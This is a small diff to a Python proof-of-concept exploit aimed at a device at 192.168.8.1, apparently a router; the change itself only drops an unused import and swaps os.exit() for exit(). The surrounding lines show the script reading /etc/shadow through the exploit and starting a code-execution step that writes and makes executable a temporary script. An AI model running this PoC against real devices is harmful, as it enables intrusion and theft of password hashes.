@@ -2,7 +2,6 @@
 import requests
 import time
 import json
-import os
 
 proto = "http"
 host = "192.168.8.1"
@@ -100,7 +99,7 @@ if __name__ == "__main__":
         # Example of read file
         poc.read_file("/etc/shadow")
 
-        os.exit()
+        exit()
 
         # Example code execution
         print("Write temp script and apply execution permission")
